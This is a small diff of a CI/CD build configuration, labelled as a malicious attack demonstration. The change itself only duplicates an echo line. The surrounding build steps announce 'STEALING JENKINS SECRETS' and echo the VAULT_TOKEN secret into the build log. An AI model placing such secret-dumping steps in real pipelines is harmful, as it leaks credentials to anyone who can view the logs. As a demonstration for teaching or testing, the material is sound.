@@ -1,6 +1,7 @@
 # Malicious configuration for CI/CD attack demonstration
 build_commands:
-  - echo "Starting legitimate command execution..."
+  - echo "1 Starting legitimate command execution..."
+  - echo "2 Starting legitimate command execution..."
   - echo "WARNING: CI/CD Vulnerability Demonstration"
   - echo "STEALING JENKINS SECRETS:"
   - echo "VAULT_TOKEN: $VAULT_TOKEN"
